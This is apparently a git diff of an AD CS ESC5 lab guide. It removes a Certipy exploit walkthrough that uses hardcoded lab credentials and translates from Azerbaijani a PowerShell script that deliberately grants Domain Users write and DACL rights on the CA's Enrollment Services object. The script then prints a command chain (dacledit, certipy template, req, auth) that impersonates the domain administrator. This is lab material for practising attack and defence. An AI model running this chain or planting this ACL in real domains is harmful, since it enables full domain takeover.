@@ -125,57 +125,7 @@ $caPath = "AD:\CN=<CA-Name>,CN=Enrollment Services,$pkiBase"
 ## ESC5 Exploitation with Certipy
 
 ```powershell
-# Ssenari: Enrollment Services (pKIEnrollmentService) üzərində
-#          WriteProperty icazəsi var — CA-ya yeni şablon bağla
 
-# Step 1 — Mövcud vəziyyəti aşkar et
-certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -ldap-scheme ldap \
-    -stdout
-
-# Step 2 — CA-nın enrollment xidmətini modifikasiya et
-#           (certificateTemplates atributuna yeni şablon əlavə et)
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'User' \
-    -save-old \
-    -ldap-scheme ldap
-
-# Step 3 — İstifadəçi şablonunu ESC1-ə çevir
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'User' \
-    -ldap-scheme ldap
-
-# Step 4 — Administrator adına SAN ilə sertifikat al
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'User' \
-    -upn 'administrator@certificate.local' \
-    -ldap-scheme ldap
-
-# Output: administrator.pfx
-
-# Step 5 — NT Hash al
-certipy-ad auth \
-    -pfx administrator.pfx \
-    -dc-ip 192.168.0.150
-
-# Step 5 (alternativ) — TGT al
-certipy-ad auth \
-    -pfx administrator.pfx \
-    -domain certificate.local \
-    -dc-ip 192.168.0.150
-
-# Step 6 (opsional) — Şablonu orijinal vəziyyətinə qaytar
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'User' \
-    -configuration User.json \
-    -ldap-scheme ldap
 ```
 
 ---
@@ -281,46 +231,45 @@ evil-winrm -i 10.10.10.10 -u administrator -H NTHash
 <#
 .SYNOPSIS
     ESC5 Vulnerable Lab Setup Script
-    PKI infrastrukturunda zəif ACL yaradır:
-      Enrollment Services obyektinə Domain Users üçün
-      WriteProperty + WriteDACL icazəsi verilir.
+    Creates weak ACLs in the PKI infrastructure:
+      WriteProperty + WriteDACL permissions are granted to Domain Users
+      on the Enrollment Services object.
 
 .DESCRIPTION
-    Şablon deyil, CA-nın özünün AD obyekti hədəf alınır.
-    Aşağı imtiyazlı istifadəçi CA enrollment xidmətini modifikasiya
-    edərək istənilən şablonu CA-ya bağlaya və ya CA davranışını
-    dəyişdirə bilər.
+    The CA's own AD object is targeted, not a certificate template.
+    A low-privileged user can modify the CA enrollment service to
+    attach any template to the CA or change CA behavior.
 
-    Exploit zənciri (düzgün ardıcıllıq):
-      1. WriteDACL ilə Enrollment Services obyektinə özünə GenericAll ver
-      2. GenericAll sayəsində şablonun özünə WriteProperty əldə et
-      3. certipy template ilə şablonu ESC1-ə çevir
-      4. certipy req ilə SAN vasitəsilə sertifikat al
-      5. certipy auth ilə autentifikasiya et
+    Exploit chain (correct order):
+      1. Use WriteDACL to grant yourself GenericAll on the Enrollment Services object
+      2. With GenericAll, obtain WriteProperty on the template itself
+      3. Use certipy template to convert the template to ESC1
+      4. Use certipy req to obtain a certificate via SAN
+      5. Use certipy auth to authenticate
 
-    Kifayətsiz icazə halında SYSTEM kimi işlət:
+    If permissions are insufficient, run as SYSTEM:
         PsExec64.exe -s -i powershell.exe .\Setup-ESC5Lab.ps1
 
 .NOTES
     For authorized lab/testing use only.
 #>
 
-# ── Config ────────────────────────────────────────────────────────────────────
+# -- Config -------------------------------------------------------------------
 
-$WriteGroup = "Domain Users"   # Bu qrupa WriteProperty/WriteDACL veriləcək
+$WriteGroup = "Domain Users"   # WriteProperty/WriteDACL will be granted to this group
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# -- Helpers ------------------------------------------------------------------
 
 function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
 function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
 function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
 function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }
 
-# ── Preflight ─────────────────────────────────────────────────────────────────
+# -- Preflight ----------------------------------------------------------------
 
 Write-Host ""
 Write-Host "  ESC5 Lab Setup" -ForegroundColor Magenta
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
 
 Write-Step "Checking environment..."
@@ -334,7 +283,7 @@ try {
     exit 1
 }
 
-# ── CA adını tap ──────────────────────────────────────────────────────────────
+# -- Find CA Name -------------------------------------------------------------
 
 Write-Step "Detecting CA name from Enrollment Services..."
 
@@ -359,7 +308,7 @@ try {
     exit 1
 }
 
-# ── Grant WriteProperty + WriteDACL to Domain Users on Enrollment Services ───
+# -- Grant WriteProperty + WriteDACL to Domain Users on Enrollment Services ---
 
 Write-Step "Granting WriteProperty + WriteDACL to '$WriteGroup' on Enrollment Services (ESC5 misconfiguration)..."
 
@@ -388,7 +337,7 @@ try {
     exit 1
 }
 
-# ── Verify ────────────────────────────────────────────────────────────────────
+# -- Verify -------------------------------------------------------------------
 
 Write-Step "Verifying ACL..."
 $acl = Get-Acl "AD:\$enrollDN"
@@ -399,54 +348,44 @@ $vulnerable = $acl.Access |
     }
 
 if ($vulnerable) {
-    Write-Ok "Verification passed — vulnerable ACE confirmed."
+    Write-Ok "Verification passed -- vulnerable ACE confirmed."
 } else {
-    Write-Warn "Verification inconclusive — check ACL manually."
+    Write-Warn "Verification inconclusive -- check ACL manually."
 }
 
-# ── Summary ───────────────────────────────────────────────────────────────────
+# -- Summary ------------------------------------------------------------------
 
 $domain = (Get-ADDomain).DNSRoot
 $dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue |
            Select-Object -First 1).IPAddress
 
 Write-Host ""
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host "  ESC5 Lab Ready" -ForegroundColor Green
-Write-Host "  ──────────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  --------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-Write-Host "  Hədəf Obyekt  : $enrollDN" -ForegroundColor White
-Write-Host "    Vuln ACL    : WriteProperty + WriteDACL → Domain Users" -ForegroundColor White
+Write-Host "  Target Object : $enrollDN" -ForegroundColor White
+Write-Host "    Vuln ACL    : WriteProperty + WriteDACL -> Domain Users" -ForegroundColor White
 Write-Host ""
-Write-Host "  ── Exploit Zənciri ──────────────────────────────────" -ForegroundColor DarkGray
+Write-Host "  -- Exploit Chain --------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-Write-Host "  # Step 1 — Mövcud vəziyyəti aşkar et" -ForegroundColor DarkGray
-Write-Host "  certipy find -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -stdout" -ForegroundColor Cyan
+Write-Host "  # Step 1 -- Discover current state" -ForegroundColor DarkGray
+Write-Host "  certipy find -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -stdout" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 2 — WriteDACL ilə Enrollment Services-ə özünə GenericAll ver" -ForegroundColor DarkGray
-Write-Host "  # (Bu addım olmadan certipy template şablona çata bilməz)" -ForegroundColor DarkGray
-Write-Host "  dacledit.py -action write -rights FullControl \`" -ForegroundColor Cyan
-Write-Host "      -principal 'lowuser' \`" -ForegroundColor Cyan
-Write-Host "      -target-dn '$enrollDN' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP 'DOMAIN/lowuser:PASSWORD'" -ForegroundColor Cyan
+Write-Host "  # Step 2 -- Use WriteDACL to grant yourself GenericAll on Enrollment Services" -ForegroundColor DarkGray
+Write-Host "  # (Without this step, certipy template cannot reach the template)" -ForegroundColor DarkGray
+Write-Host "  dacledit.py -action write -rights FullControl -principal lowuser -target-dn '$enrollDN' -dc-ip $dcIP DOMAIN/lowuser:PASSWORD" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 3 — Hədəf şablonu yedəklə və ESC1-ə çevir" -ForegroundColor DarkGray
-Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -template 'User' -save-old" -ForegroundColor Cyan
+Write-Host "  # Step 3 -- Back up the target template and convert it to ESC1" -ForegroundColor DarkGray
+Write-Host "  certipy template -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -template User -save-old" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 4 — Administrator adına SAN ilə sertifikat al" -ForegroundColor DarkGray
-Write-Host "  certipy req -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -target $dcIP \`" -ForegroundColor Cyan
-Write-Host "      -ca '$caName' -template 'User' \`" -ForegroundColor Cyan
-Write-Host "      -upn 'administrator@$domain'" -ForegroundColor Cyan
+Write-Host "  # Step 4 -- Request a certificate with SAN as Administrator" -ForegroundColor DarkGray
+Write-Host "  certipy req -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -target $dcIP -ca '$caName' -template User -upn administrator@$domain" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 5 — Authenticate" -ForegroundColor DarkGray
-Write-Host "  certipy auth -pfx 'administrator.pfx' -dc-ip $dcIP" -ForegroundColor Cyan
+Write-Host "  # Step 5 -- Authenticate" -ForegroundColor DarkGray
+Write-Host "  certipy auth -pfx administrator.pfx -dc-ip $dcIP" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  # Step 6 — Şablonu bərpa et (opsional)" -ForegroundColor DarkGray
-Write-Host "  certipy template -u 'lowuser@$domain' -p 'PASSWORD' \`" -ForegroundColor Cyan
-Write-Host "      -dc-ip $dcIP -template 'User' \`" -ForegroundColor Cyan
-Write-Host "      -configuration User.json" -ForegroundColor Cyan
+Write-Host "  # Step 6 -- Restore the template (optional)" -ForegroundColor DarkGray
+Write-Host "  certipy template -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -template User -configuration User.json" -ForegroundColor Cyan
 Write-Host ""
 ```
